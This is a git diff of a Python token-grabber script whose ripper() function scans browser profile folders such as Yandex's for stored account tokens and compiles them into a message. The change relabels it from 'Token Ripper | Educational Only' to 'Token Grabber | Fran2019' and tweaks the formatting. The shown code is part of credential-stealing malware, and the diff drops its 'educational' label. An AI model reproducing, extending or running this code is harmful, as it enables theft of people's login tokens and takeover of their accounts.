@@ -43,7 +43,7 @@ def ripper():
             'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
         }
     
-    message = '```' + 'Token Ripper | Educational Only\n'                                   # Title of the message
+    message = '```yaml' + 'Token Grabber | Fran2019\n'                                   # Title of the message
 
     for path in paths:
         if not os.path.exists(path):
@@ -55,7 +55,7 @@ def ripper():
 
         if len(tokens) > 0:                                                                 # If tokens exists adding the tokens to the message
             for token in tokens:
-                message += f'{token}\n'
+                message += f'\n{token}\n'
         else:
             message += "No tokens found.\n"                                                 # If tokens does not exists adding "No tokens found." to the message
     
